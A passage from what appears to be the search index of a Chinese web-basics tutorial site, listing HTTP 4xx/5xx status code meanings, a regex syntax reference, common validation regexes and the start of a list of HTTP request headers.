\u670d\u52a1\u5668\u4e0d\u7406\u89e3\u8bf7\u6c42\u7684\u8bed\u6cd5\u3002 \n401   \u8bf7\u6c42\u8981\u6c42\u8eab\u4efd\u9a8c\u8bc1\u3002 \u5bf9\u4e8e\u9700\u8981\u767b\u5f55\u7684\u7f51\u9875\uff0c\u670d\u52a1\u5668\u53ef\u80fd\u8fd4\u56de\u6b64\u54cd\u5e94\u3002 \n403   \u670d\u52a1\u5668\u62d2\u7edd\u8bf7\u6c42\u3002 \n404   \u670d\u52a1\u5668\u627e\u4e0d\u5230\u8bf7\u6c42\u7684\u7f51\u9875\u3002 \n405   \u7981\u7528\u8bf7\u6c42\u4e2d\u6307\u5b9a\u7684\u65b9\u6cd5\u3002 \n406   \u65e0\u6cd5\u4f7f\u7528\u8bf7\u6c42\u7684\u5185\u5bb9\u7279\u6027\u54cd\u5e94\u8bf7\u6c42\u7684\u7f51\u9875\u3002 \n407   \u6b64\u72b6\u6001\u4ee3\u7801\u4e0e 401\u7c7b\u4f3c\uff0c\u4f46\u6307\u5b9a\u8bf7\u6c42\u8005\u5e94\u5f53\u6388\u6743\u4f7f\u7528\u4ee3\u7406\u3002 \n408   \u670d\u52a1\u5668\u7b49\u5019\u8bf7\u6c42\u65f6\u53d1\u751f\u8d85\u65f6\u3002 \n409   \u670d\u52a1\u5668\u5728\u5b8c\u6210\u8bf7\u6c42\u65f6\u53d1\u751f\u51b2\u7a81\u3002 \u670d\u52a1\u5668\u5fc5\u987b\u5728\u54cd\u5e94\u4e2d\u5305\u542b\u6709\u5173\u51b2\u7a81\u7684\u4fe1\u606f\u3002 \n410   \u5982\u679c\u8bf7\u6c42\u7684\u8d44\u6e90\u5df2\u6c38\u4e45\u5220\u9664\uff0c\u670d\u52a1\u5668\u5c31\u4f1a\u8fd4\u56de\u6b64\u54cd\u5e94\u3002 \n411   \u670d\u52a1\u5668\u4e0d\u63a5\u53d7\u4e0d\u542b\u6709\u6548\u5185\u5bb9\u957f\u5ea6\u6807\u5934\u5b57\u6bb5\u7684\u8bf7\u6c42\u3002 \n412   \u670d\u52a1\u5668\u672a\u6ee1\u8db3\u8bf7\u6c42\u8005\u5728\u8bf7\u6c42\u4e2d\u8bbe\u7f6e\u7684\u5176\u4e2d\u4e00\u4e2a\u524d\u63d0\u6761\u4ef6\u3002 \n413   \u670d\u52a1\u5668\u65e0\u6cd5\u5904\u7406\u8bf7\u6c42\uff0c\u56e0\u4e3a\u8bf7\u6c42\u5b9e\u4f53\u8fc7\u5927\uff0c\u8d85\u51fa\u670d\u52a1\u5668\u7684\u5904\u7406\u80fd\u529b\u3002 \n414   \u8bf7\u6c42\u7684 URI\uff08\u901a\u5e38\u4e3a\u7f51\u5740\uff09\u8fc7\u957f\uff0c\u670d\u52a1\u5668\u65e0\u6cd5\u5904\u7406\u3002 \n415   \u8bf7\u6c42\u7684\u683c\u5f0f\u4e0d\u53d7\u8bf7\u6c42\u9875\u9762\u7684\u652f\u6301\u3002 \n416   \u5982\u679c\u9875\u9762\u65e0\u6cd5\u63d0\u4f9b\u8bf7\u6c42\u7684\u8303\u56f4\uff0c\u5219\u670d\u52a1\u5668\u4f1a\u8fd4\u56de\u6b64\u72b6\u6001\u4ee3\u7801\u3002 \n417   \u670d\u52a1\u5668\u672a\u6ee1\u8db3\u201d\u671f\u671b\u201d\u8bf7\u6c42\u6807\u5934\u5b57\u6bb5\u7684\u8981\u6c42\u3002\n\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\n5\u5f00\u5934\u72b6\u6001\u7801\u5e76\u4e0d\u5e38\u89c1\uff0c\u4f46\u662f\u6211\u4eec\u5e94\u8be5\u77e5\u9053\n\n500   \uff08\u670d\u52a1\u5668\u5185\u90e8\u9519\u8bef\uff09  \u670d\u52a1\u5668\u9047\u5230\u9519\u8bef\uff0c\u65e0\u6cd5\u5b8c\u6210\u8bf7\u6c42\u3002 \n501   \uff08\u5c1a\u672a\u5b9e\u65bd\uff09 \u670d\u52a1\u5668\u4e0d\u5177\u5907\u5b8c\u6210\u8bf7\u6c42\u7684\u529f\u80fd\u3002 \u4f8b\u5982\uff0c\u670d\u52a1\u5668\u65e0\u6cd5\u8bc6\u522b\u8bf7\u6c42\u65b9\u6cd5\u65f6\u53ef\u80fd\u4f1a\u8fd4\u56de\u6b64\u4ee3\u7801\u3002 \n502   \uff08\u9519\u8bef\u7f51\u5173\uff09 \u670d\u52a1\u5668\u4f5c\u4e3a\u7f51\u5173\u6216\u4ee3\u7406\uff0c\u4ece\u4e0a\u6e38\u670d\u52a1\u5668\u6536\u5230\u65e0\u6548\u54cd\u5e94\u3002 \n503   \uff08\u670d\u52a1\u4e0d\u53ef\u7528\uff09 \u670d\u52a1\u5668\u76ee\u524d\u65e0\u6cd5\u4f7f\u7528\uff08\u7531\u4e8e\u8d85\u8f7d\u6216\u505c\u673a\u7ef4\u62a4\uff09\u3002 \u901a\u5e38\uff0c\u8fd9\u53ea\u662f\u6682\u65f6\u72b6\u6001\u3002 \n504   \uff08\u7f51\u5173\u8d85\u65f6\uff09  \u670d\u52a1\u5668\u4f5c\u4e3a\u7f51\u5173\u6216\u4ee3\u7406\uff0c\u4f46\u662f\u6ca1\u6709\u53ca\u65f6\u4ece\u4e0a\u6e38\u670d\u52a1\u5668\u6536\u5230\u8bf7\u6c42\u3002 \n505   \uff08HTTP \u7248\u672c\u4e0d\u53d7\u652f\u6301\uff09 \u670d\u52a1\u5668\u4e0d\u652f\u6301\u8bf7\u6c42\u4e2d\u6240\u7528\u7684 HTTP \u534f\u8bae\u7248\u672c\u3002  \n</code></pre>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E5%9F%BA%E7%A1%80%E7%AF%87/#2","title":"2.\u6b63\u5219\u8868\u8fbe\u5f0f","text":"<p>https://ihateregex.io/ https://tool.oschina.net/regex</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E5%9F%BA%E7%A1%80%E7%AF%87/#_5","title":"\u8868\u8fbe\u5f0f\u5168\u96c6","text":"<p>\u5185\u5bb9\u8f83\u957f\uff0c\u5c55\u5f00\u67e5\u770b</p> \u70b9\u51fb\u5c55\u5f00/\u6536\u8d77 \u5b57\u7b26 \u63cf\u8ff0 \\ \u5c06\u4e0b\u4e00\u4e2a\u5b57\u7b26\u6807\u8bb0\u4e3a\u4e00\u4e2a\u7279\u6b8a\u5b57\u7b26\u3001\u6216\u4e00\u4e2a\u539f\u4e49\u5b57\u7b26\u3001\u6216\u4e00\u4e2a\u5411\u540e\u5f15\u7528\u3001\u6216\u4e00\u4e2a\u516b\u8fdb\u5236\u8f6c\u4e49\u7b26\u3002\u4f8b\u5982\uff0c\u201cn\u201d\u5339\u914d\u5b57\u7b26\u201cn\u201d\u800c\u201c\\n\u201d\u5339\u914d\u4e00\u4e2a\u6362\u884c\u7b26\u3002\u4e32\u884c\u201c\\\\\u201d\u5339\u914d\u201c\\\u201d\u800c\u201c\\(\u201d\u5219\u5339\u914d\u201c(\u201d\u3002 ^ \u5339\u914d\u8f93\u5165\u5b57\u7b26\u4e32\u7684\u5f00\u59cb\u4f4d\u7f6e\u3002\u5982\u679c\u8bbe\u7f6e\u4e86RegExp\u5bf9\u8c61\u7684Multiline\u5c5e\u6027\uff0c^\u4e5f\u5339\u914d\u201c\\n\u201d\u6216\u201c\\r\u201d\u4e4b\u540e\u7684\u4f4d\u7f6e\u3002 $ \u5339\u914d\u8f93\u5165\u5b57\u7b26\u4e32\u7684\u7ed3\u675f\u4f4d\u7f6e\u3002\u5982\u679c\u8bbe\u7f6e\u4e86RegExp\u5bf9\u8c61\u7684Multiline\u5c5e\u6027\uff0c$\u4e5f\u5339\u914d\u201c\\n\u201d\u6216\u201c\\r\u201d\u4e4b\u524d\u7684\u4f4d\u7f6e\u3002 * \u5339\u914d\u524d\u9762\u7684\u5b50\u8868\u8fbe\u5f0f\u96f6\u6b21\u6216\u591a\u6b21\u3002\u4f8b\u5982\uff0czo\u80fd\u5339\u914d\u201cz\u201d\u4ee5\u53ca\u201czoo\u201d\u3002\u7b49\u4ef7\u4e8e{0,}\u3002 + \u5339\u914d\u524d\u9762\u7684\u5b50\u8868\u8fbe\u5f0f\u4e00\u6b21\u6216\u591a\u6b21\u3002\u4f8b\u5982\uff0c\u201czo+\u201d\u80fd\u5339\u914d\u201czo\u201d\u4ee5\u53ca\u201czoo\u201d\uff0c\u4f46\u4e0d\u80fd\u5339\u914d\u201cz\u201d\u3002+\u7b49\u4ef7\u4e8e{1,}\u3002 ? \u5339\u914d\u524d\u9762\u7684\u5b50\u8868\u8fbe\u5f0f\u96f6\u6b21\u6216\u4e00\u6b21\u3002\u4f8b\u5982\uff0c\u201cdo(es)?\u201d\u53ef\u4ee5\u5339\u914d\u201cdoes\u201d\u6216\u201cdoes\u201d\u4e2d\u7684\u201cdo\u201d\u3002?\u7b49\u4ef7\u4e8e{0,1}\u3002 {n} _n_\u662f\u4e00\u4e2a\u975e\u8d1f\u6574\u6570\u3002\u5339\u914d\u786e\u5b9a\u7684_n_\u6b21\u3002\u4f8b\u5982\uff0c\u201co{2}\u201d\u4e0d\u80fd\u5339\u914d\u201cBob\u201d\u4e2d\u7684\u201co\u201d\uff0c\u4f46\u662f\u80fd\u5339\u914d\u201cfood\u201d\u4e2d\u7684\u4e24\u4e2ao\u3002 {n,} _n_\u662f\u4e00\u4e2a\u975e\u8d1f\u6574\u6570\u3002\u81f3\u5c11\u5339\u914d_n_\u6b21\u3002\u4f8b\u5982\uff0c\u201co{2,}\u201d\u4e0d\u80fd\u5339\u914d\u201cBob\u201d\u4e2d\u7684\u201co\u201d\uff0c\u4f46\u80fd\u5339\u914d\u201cfoooood\u201d\u4e2d\u7684\u6240\u6709o\u3002\u201co{1,}\u201d\u7b49\u4ef7\u4e8e\u201co+\u201d\u3002\u201co{0,}\u201d\u5219\u7b49\u4ef7\u4e8e\u201co*\u201d\u3002 {n,m} m_\u548c_n_\u5747\u4e3a\u975e\u8d1f\u6574\u6570\uff0c\u5176\u4e2d_n&lt;=m\u3002\u6700\u5c11\u5339\u914d_n_\u6b21\u4e14\u6700\u591a\u5339\u914d_m_\u6b21\u3002\u4f8b\u5982\uff0c\u201co{1,3}\u201d\u5c06\u5339\u914d\u201cfooooood\u201d\u4e2d\u7684\u524d\u4e09\u4e2ao\u3002\u201co{0,1}\u201d\u7b49\u4ef7\u4e8e\u201co?\u201d\u3002\u8bf7\u6ce8\u610f\u5728\u9017\u53f7\u548c\u4e24\u4e2a\u6570\u4e4b\u95f4\u4e0d\u80fd\u6709\u7a7a\u683c\u3002 ? \u5f53\u8be5\u5b57\u7b26\u7d27\u8ddf\u5728\u4efb\u4f55\u4e00\u4e2a\u5176\u4ed6\u9650\u5236\u7b26\uff08*,+,?\uff0c{n}\uff0c{n,}\uff0c{n,m}\uff09\u540e\u9762\u65f6\uff0c\u5339\u914d\u6a21\u5f0f\u662f\u975e\u8d2a\u5a6a\u7684\u3002\u975e\u8d2a\u5a6a\u6a21\u5f0f\u5c3d\u53ef\u80fd\u5c11\u7684\u5339\u914d\u6240\u641c\u7d22\u7684\u5b57\u7b26\u4e32\uff0c\u800c\u9ed8\u8ba4\u7684\u8d2a\u5a6a\u6a21\u5f0f\u5219\u5c3d\u53ef\u80fd\u591a\u7684\u5339\u914d\u6240\u641c\u7d22\u7684\u5b57\u7b26\u4e32\u3002\u4f8b\u5982\uff0c\u5bf9\u4e8e\u5b57\u7b26\u4e32\u201coooo\u201d\uff0c\u201co+?\u201d\u5c06\u5339\u914d\u5355\u4e2a\u201co\u201d\uff0c\u800c\u201co+\u201d\u5c06\u5339\u914d\u6240\u6709\u201co\u201d\u3002 . \u5339\u914d\u9664\u201c\\n\u201d\u4e4b\u5916\u7684\u4efb\u4f55\u5355\u4e2a\u5b57\u7b26\u3002\u8981\u5339\u914d\u5305\u62ec\u201c\\n\u201d\u5728\u5185\u7684\u4efb\u4f55\u5b57\u7b26\uff0c\u8bf7\u4f7f\u7528\u50cf\u201c(.|\\n)\u201d\u7684\u6a21\u5f0f\u3002 (pattern) \u5339\u914dpattern\u5e76\u83b7\u53d6\u8fd9\u4e00\u5339\u914d\u3002\u6240\u83b7\u53d6\u7684\u5339\u914d\u53ef\u4ee5\u4ece\u4ea7\u751f\u7684Matches\u96c6\u5408\u5f97\u5230\uff0c\u5728VBScript\u4e2d\u4f7f\u7528SubMatches\u96c6\u5408\uff0c\u5728JScript\u4e2d\u5219\u4f7f\u7528\\(0\u2026\\)9\u5c5e\u6027\u3002\u8981\u5339\u914d\u5706\u62ec\u53f7\u5b57\u7b26\uff0c\u8bf7\u4f7f\u7528\u201c\\(\u201d\u6216\u201c\\)\u201d\u3002 (?:pattern) \u5339\u914dpattern\u4f46\u4e0d\u83b7\u53d6\u5339\u914d\u7ed3\u679c\uff0c\u4e5f\u5c31\u662f\u8bf4\u8fd9\u662f\u4e00\u4e2a\u975e\u83b7\u53d6\u5339\u914d\uff0c\u4e0d\u8fdb\u884c\u5b58\u50a8\u4f9b\u4ee5\u540e\u4f7f\u7528\u3002\u8fd9\u5728\u4f7f\u7528\u6216\u5b57\u7b26\u201c(|)\u201d\u6765\u7ec4\u5408\u4e00\u4e2a\u6a21\u5f0f\u7684\u5404\u4e2a\u90e8\u5206\u662f\u5f88\u6709\u7528\u3002\u4f8b\u5982\u201cindustr(?:y|ies)\u201d\u5c31\u662f\u4e00\u4e2a\u6bd4\u201cindustry|industries\u201d\u66f4\u7b80\u7565\u7684\u8868\u8fbe\u5f0f\u3002 (?=pattern) \u6b63\u5411\u80af\u5b9a\u9884\u67e5\uff0c\u5728\u4efb\u4f55\u5339\u914dpattern\u7684\u5b57\u7b26\u4e32\u5f00\u59cb\u5904\u5339\u914d\u67e5\u627e\u5b57\u7b26\u4e32\u3002\u8fd9\u662f\u4e00\u4e2a\u975e\u83b7\u53d6\u5339\u914d\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u8be5\u5339\u914d\u4e0d\u9700\u8981\u83b7\u53d6\u4f9b\u4ee5\u540e\u4f7f\u7528\u3002\u4f8b\u5982\uff0c\u201cWindows(?=95|98|NT|2000)\u201d\u80fd\u5339\u914d\u201cWindows2000\u201d\u4e2d\u7684\u201cWindows\u201d\uff0c\u4f46\u4e0d\u80fd\u5339\u914d\u201cWindows3.1\u201d\u4e2d\u7684\u201cWindows\u201d\u3002\u9884\u67e5\u4e0d\u6d88\u8017\u5b57\u7b26\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u5728\u4e00\u4e2a\u5339\u914d\u53d1\u751f\u540e\uff0c\u5728\u6700\u540e\u4e00\u6b21\u5339\u914d\u4e4b\u540e\u7acb\u5373\u5f00\u59cb\u4e0b\u4e00\u6b21\u5339\u914d\u7684\u641c\u7d22\uff0c\u800c\u4e0d\u662f\u4ece\u5305\u542b\u9884\u67e5\u7684\u5b57\u7b26\u4e4b\u540e\u5f00\u59cb\u3002 (?!pattern) \u6b63\u5411\u5426\u5b9a\u9884\u67e5\uff0c\u5728\u4efb\u4f55\u4e0d\u5339\u914dpattern\u7684\u5b57\u7b26\u4e32\u5f00\u59cb\u5904\u5339\u914d\u67e5\u627e\u5b57\u7b26\u4e32\u3002\u8fd9\u662f\u4e00\u4e2a\u975e\u83b7\u53d6\u5339\u914d\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u8be5\u5339\u914d\u4e0d\u9700\u8981\u83b7\u53d6\u4f9b\u4ee5\u540e\u4f7f\u7528\u3002\u4f8b\u5982\u201cWindows(?!95|98|NT|2000)\u201d\u80fd\u5339\u914d\u201cWindows3.1\u201d\u4e2d\u7684\u201cWindows\u201d\uff0c\u4f46\u4e0d\u80fd\u5339\u914d\u201cWindows2000\u201d\u4e2d\u7684\u201cWindows\u201d\u3002\u9884\u67e5\u4e0d\u6d88\u8017\u5b57\u7b26\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u5728\u4e00\u4e2a\u5339\u914d\u53d1\u751f\u540e\uff0c\u5728\u6700\u540e\u4e00\u6b21\u5339\u914d\u4e4b\u540e\u7acb\u5373\u5f00\u59cb\u4e0b\u4e00\u6b21\u5339\u914d\u7684\u641c\u7d22\uff0c\u800c\u4e0d\u662f\u4ece\u5305\u542b\u9884\u67e5\u7684\u5b57\u7b26\u4e4b\u540e\u5f00\u59cb (?&lt;=pattern) \u53cd\u5411\u80af\u5b9a\u9884\u67e5\uff0c\u4e0e\u6b63\u5411\u80af\u5b9a\u9884\u67e5\u7c7b\u62df\uff0c\u53ea\u662f\u65b9\u5411\u76f8\u53cd\u3002\u4f8b\u5982\uff0c\u201c(?&lt;=95|98|NT|2000)Windows\u201d\u80fd\u5339\u914d\u201c2000Windows\u201d\u4e2d\u7684\u201cWindows\u201d\uff0c\u4f46\u4e0d\u80fd\u5339\u914d\u201c3.1Windows\u201d\u4e2d\u7684\u201cWindows\u201d\u3002 (?&lt;!pattern) \u53cd\u5411\u5426\u5b9a\u9884\u67e5\uff0c\u4e0e\u6b63\u5411\u5426\u5b9a\u9884\u67e5\u7c7b\u62df\uff0c\u53ea\u662f\u65b9\u5411\u76f8\u53cd\u3002\u4f8b\u5982\u201c(?&lt;!95|98|NT|2000)Windows\u201d\u80fd\u5339\u914d\u201c3.1Windows\u201d\u4e2d\u7684\u201cWindows\u201d\uff0c\u4f46\u4e0d\u80fd\u5339\u914d\u201c2000Windows\u201d\u4e2d\u7684\u201cWindows\u201d\u3002 x|y \u5339\u914dx\u6216y\u3002\u4f8b\u5982\uff0c\u201cz|food\u201d\u80fd\u5339\u914d\u201cz\u201d\u6216\u201cfood\u201d\u3002\u201c(z|f)ood\u201d\u5219\u5339\u914d\u201czood\u201d\u6216\u201cfood\u201d\u3002 [xyz] \u5b57\u7b26\u96c6\u5408\u3002\u5339\u914d\u6240\u5305\u542b\u7684\u4efb\u610f\u4e00\u4e2a\u5b57\u7b26\u3002\u4f8b\u5982\uff0c\u201c[abc]\u201d\u53ef\u4ee5\u5339\u914d\u201cplain\u201d\u4e2d\u7684\u201ca\u201d\u3002 [^xyz] \u8d1f\u503c\u5b57\u7b26\u96c6\u5408\u3002\u5339\u914d\u672a\u5305\u542b\u7684\u4efb\u610f\u5b57\u7b26\u3002\u4f8b\u5982\uff0c\u201c[^abc]\u201d\u53ef\u4ee5\u5339\u914d\u201cplain\u201d\u4e2d\u7684\u201cp\u201d\u3002 [a-z] \u5b57\u7b26\u8303\u56f4\u3002\u5339\u914d\u6307\u5b9a\u8303\u56f4\u5185\u7684\u4efb\u610f\u5b57\u7b26\u3002\u4f8b\u5982\uff0c\u201c[a-z]\u201d\u53ef\u4ee5\u5339\u914d\u201ca\u201d\u5230\u201cz\u201d\u8303\u56f4\u5185\u7684\u4efb\u610f\u5c0f\u5199\u5b57\u6bcd\u5b57\u7b26\u3002 [^a-z] \u8d1f\u503c\u5b57\u7b26\u8303\u56f4\u3002\u5339\u914d\u4efb\u4f55\u4e0d\u5728\u6307\u5b9a\u8303\u56f4\u5185\u7684\u4efb\u610f\u5b57\u7b26\u3002\u4f8b\u5982\uff0c\u201c[^a-z]\u201d\u53ef\u4ee5\u5339\u914d\u4efb\u4f55\u4e0d\u5728\u201ca\u201d\u5230\u201cz\u201d\u8303\u56f4\u5185\u7684\u4efb\u610f\u5b57\u7b26\u3002 \\b \u5339\u914d\u4e00\u4e2a\u5355\u8bcd\u8fb9\u754c\uff0c\u4e5f\u5c31\u662f\u6307\u5355\u8bcd\u548c\u7a7a\u683c\u95f4\u7684\u4f4d\u7f6e\u3002\u4f8b\u5982\uff0c\u201cer\\b\u201d\u53ef\u4ee5\u5339\u914d\u201cnever\u201d\u4e2d\u7684\u201cer\u201d\uff0c\u4f46\u4e0d\u80fd\u5339\u914d\u201cverb\u201d\u4e2d\u7684\u201cer\u201d\u3002 \\B \u5339\u914d\u975e\u5355\u8bcd\u8fb9\u754c\u3002\u201cer\\B\u201d\u80fd\u5339\u914d\u201cverb\u201d\u4e2d\u7684\u201cer\u201d\uff0c\u4f46\u4e0d\u80fd\u5339\u914d\u201cnever\u201d\u4e2d\u7684\u201cer\u201d\u3002 \\cx \u5339\u914d\u7531x\u6307\u660e\u7684\u63a7\u5236\u5b57\u7b26\u3002\u4f8b\u5982\uff0c\\cM\u5339\u914d\u4e00\u4e2aControl-M\u6216\u56de\u8f66\u7b26\u3002x\u7684\u503c\u5fc5\u987b\u4e3aA-Z\u6216a-z\u4e4b\u4e00\u3002\u5426\u5219\uff0c\u5c06c\u89c6\u4e3a\u4e00\u4e2a\u539f\u4e49\u7684\u201cc\u201d\u5b57\u7b26\u3002 \\d \u5339\u914d\u4e00\u4e2a\u6570\u5b57\u5b57\u7b26\u3002\u7b49\u4ef7\u4e8e[0-9]\u3002 \\D \u5339\u914d\u4e00\u4e2a\u975e\u6570\u5b57\u5b57\u7b26\u3002\u7b49\u4ef7\u4e8e[^0-9]\u3002 \\f \u5339\u914d\u4e00\u4e2a\u6362\u9875\u7b26\u3002\u7b49\u4ef7\u4e8e\\x0c\u548c\\cL\u3002 \\n \u5339\u914d\u4e00\u4e2a\u6362\u884c\u7b26\u3002\u7b49\u4ef7\u4e8e\\x0a\u548c\\cJ\u3002 \\r \u5339\u914d\u4e00\u4e2a\u56de\u8f66\u7b26\u3002\u7b49\u4ef7\u4e8e\\x0d\u548c\\cM\u3002 \\s \u5339\u914d\u4efb\u4f55\u7a7a\u767d\u5b57\u7b26\uff0c\u5305\u62ec\u7a7a\u683c\u3001\u5236\u8868\u7b26\u3001\u6362\u9875\u7b26\u7b49\u7b49\u3002\u7b49\u4ef7\u4e8e[ \\f\\n\\r\\t\\v]\u3002 \\S \u5339\u914d\u4efb\u4f55\u975e\u7a7a\u767d\u5b57\u7b26\u3002\u7b49\u4ef7\u4e8e[^ \\f\\n\\r\\t\\v]\u3002 \\t \u5339\u914d\u4e00\u4e2a\u5236\u8868\u7b26\u3002\u7b49\u4ef7\u4e8e\\x09\u548c\\cI\u3002 \\v \u5339\u914d\u4e00\u4e2a\u5782\u76f4\u5236\u8868\u7b26\u3002\u7b49\u4ef7\u4e8e\\x0b\u548c\\cK\u3002 \\w \u5339\u914d\u5305\u62ec\u4e0b\u5212\u7ebf\u7684\u4efb\u4f55\u5355\u8bcd\u5b57\u7b26\u3002\u7b49\u4ef7\u4e8e\u201c[A-Za-z0-9_]\u201d\u3002 \\W \u5339\u914d\u4efb\u4f55\u975e\u5355\u8bcd\u5b57\u7b26\u3002\u7b49\u4ef7\u4e8e\u201c[^A-Za-z0-9_]\u201d\u3002 \\x_n_ \u5339\u914d_n_\uff0c\u5176\u4e2d_n_\u4e3a\u5341\u516d\u8fdb\u5236\u8f6c\u4e49\u503c\u3002\u5341\u516d\u8fdb\u5236\u8f6c\u4e49\u503c\u5fc5\u987b\u4e3a\u786e\u5b9a\u7684\u4e24\u4e2a\u6570\u5b57\u957f\u3002\u4f8b\u5982\uff0c\u201c\\x41\u201d\u5339\u914d\u201cA\u201d\u3002\u201c\\x041\u201d\u5219\u7b49\u4ef7\u4e8e\u201c\\x04&amp;1\u201d\u3002\u6b63\u5219\u8868\u8fbe\u5f0f\u4e2d\u53ef\u4ee5\u4f7f\u7528ASCII\u7f16\u7801\u3002. \\num \u5339\u914d_num_\uff0c\u5176\u4e2d_num_\u662f\u4e00\u4e2a\u6b63\u6574\u6570\u3002\u5bf9\u6240\u83b7\u53d6\u7684\u5339\u914d\u7684\u5f15\u7528\u3002\u4f8b\u5982\uff0c\u201c(.)\\1\u201d\u5339\u914d\u4e24\u4e2a\u8fde\u7eed\u7684\u76f8\u540c\u5b57\u7b26\u3002 \\n \u6807\u8bc6\u4e00\u4e2a\u516b\u8fdb\u5236\u8f6c\u4e49\u503c\u6216\u4e00\u4e2a\u5411\u540e\u5f15\u7528\u3002\u5982\u679c\\_n_\u4e4b\u524d\u81f3\u5c11_n_\u4e2a\u83b7\u53d6\u7684\u5b50\u8868\u8fbe\u5f0f\uff0c\u5219_n_\u4e3a\u5411\u540e\u5f15\u7528\u3002\u5426\u5219\uff0c\u5982\u679c_n_\u4e3a\u516b\u8fdb\u5236\u6570\u5b57\uff080-7\uff09\uff0c\u5219_n_\u4e3a\u4e00\u4e2a\u516b\u8fdb\u5236\u8f6c\u4e49\u503c\u3002 \\nm \u6807\u8bc6\u4e00\u4e2a\u516b\u8fdb\u5236\u8f6c\u4e49\u503c\u6216\u4e00\u4e2a\u5411\u540e\u5f15\u7528\u3002\u5982\u679c\\nm_\u4e4b\u524d\u81f3\u5c11\u6709_nm_\u4e2a\u83b7\u5f97\u5b50\u8868\u8fbe\u5f0f\uff0c\u5219_nm_\u4e3a\u5411\u540e\u5f15\u7528\u3002\u5982\u679c\\_nm_\u4e4b\u524d\u81f3\u5c11\u6709_n_\u4e2a\u83b7\u53d6\uff0c\u5219_n_\u4e3a\u4e00\u4e2a\u540e\u8ddf\u6587\u5b57_m_\u7684\u5411\u540e\u5f15\u7528\u3002\u5982\u679c\u524d\u9762\u7684\u6761\u4ef6\u90fd\u4e0d\u6ee1\u8db3\uff0c\u82e5_n_\u548c_m_\u5747\u4e3a\u516b\u8fdb\u5236\u6570\u5b57\uff080-7\uff09\uff0c\u5219\\_nm_\u5c06\u5339\u914d\u516b\u8fdb\u5236\u8f6c\u4e49\u503c_nm\u3002 \\nml \u5982\u679c_n_\u4e3a\u516b\u8fdb\u5236\u6570\u5b57\uff080-3\uff09\uff0c\u4e14_m\u548cl_\u5747\u4e3a\u516b\u8fdb\u5236\u6570\u5b57\uff080-7\uff09\uff0c\u5219\u5339\u914d\u516b\u8fdb\u5236\u8f6c\u4e49\u503c_nm_l\u3002 \\u_n_ \u5339\u914d_n_\uff0c\u5176\u4e2d_n_\u662f\u4e00\u4e2a\u7528\u56db\u4e2a\u5341\u516d\u8fdb\u5236\u6570\u5b57\u8868\u793a\u7684Unicode\u5b57\u7b26\u3002\u4f8b\u5982\uff0c\\u00A9\u5339\u914d\u7248\u6743\u7b26\u53f7\uff08\u00a9\uff09\u3002"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E5%9F%BA%E7%A1%80%E7%AF%87/#_6","title":"\u5e38\u7528\u6b63\u5219\u8868\u8fbe\u5f0f","text":"\u7528\u6237\u540d /^[a-z0-9_-]{3,16}$/ \u5bc6\u7801 /^[a-z0-9_-]{6,18}$/ \u5341\u516d\u8fdb\u5236\u503c /^#?([a-f0-9]{6}|[a-f0-9]{3})$/ \u7535\u5b50\u90ae\u7bb1 /^([a-z0-9_\\.-]+)@([\\da-z\\.-]+)\\.([a-z\\.]{2,6})$/ <code>/^[a-z\\\\d]+(\\\\.[a-z\\\\d]+)*@([\\\\da-z](-[\\\\da-z])?)+(\\\\.{1,2}[a-z]+)+$/</code> URL /^(https?:\\/\\/)?([\\da-z\\.-]+)\\.([a-z\\.]{2,6})([\\/\\w \\.-])\\/?$/ IP \u5730\u5740 /((2[0-4]\\d|25[0-5]|[01]?\\d\\d?)\\.){3}(2[0-4]\\d|25[0-5]|[01]?\\d\\d?)/ /^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/ HTML \u6807\u7b7e /<sup>&lt;([a-z]+)([</sup>&lt;]+)(?:&gt;(.)&lt;\\/\\1&gt;|\\s+\\/&gt;)$/ \u5220\u9664\u4ee3\u7801\\\\\u6ce8\u91ca (?&lt;!http:|\\S)//.*$ Unicode\u7f16\u7801\u4e2d\u7684\u6c49\u5b57\u8303\u56f4 /^[\\u2E80-\\u9FFF]+$/"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E5%9F%BA%E7%A1%80%E7%AF%87/#3http","title":"3.\u5e38\u89c1\u7684HTTP\u5934\u90e8\u4fe1\u606f","text":"<p>Accept: \u5141\u8bb8\u54ea\u4e9b\u5a92\u4f53\u7c7b\u578b Accept-Charset: \u5141\u8bb8\u54ea\u4e9b\u5b57\u7b26\u96c6 Accept-Encoding: \u5141\u8bb8\u54ea\u4e9b\u7f16\u7801 Accept-Language: \u5141\u8bb8\u54ea\u4e9b\u8bed\u8a00 Cache-Control: \u7f13\u5b58\u7b56\u7565\uff0c\u5982no-cache\uff0c\u8be6\u89c1\u5b98\u65b9\u6587\u6863 Connection: \u8fde\u63a5\u9009\u9879\uff0c\u4f8b\u5982\u662f\u5426\u5141\u8bb8\u4ee3\u7406\u3002 Host: \u8bf7\u6c42\u7684\u4e3b\u673a If-None-Match: 